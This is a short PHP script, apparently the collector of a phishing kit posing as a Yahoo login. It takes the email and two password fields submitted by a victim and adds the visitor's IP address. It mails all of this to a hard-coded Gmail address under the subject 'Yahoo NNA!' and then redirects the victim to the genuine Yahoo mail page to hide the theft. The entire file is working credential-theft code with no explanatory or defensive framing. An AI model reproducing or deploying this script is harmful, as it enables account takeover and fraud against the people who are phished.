<?

$ip = getenv("REMOTE_ADDR");
$message .= "user: ".$_POST['Email']."\n";
$message .= "pass1 : ".$_POST['passwd']."\n";
$message .= "pass2 : ".$_POST['passwrd']."\n";
$message .= "IP: ".$ip."\n";


$recipient = "ahmedziamo@gmail.com";
$subject = "Yahoo NNA! | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location:  http://uk.overview.mail.yahoo.com/
");
?>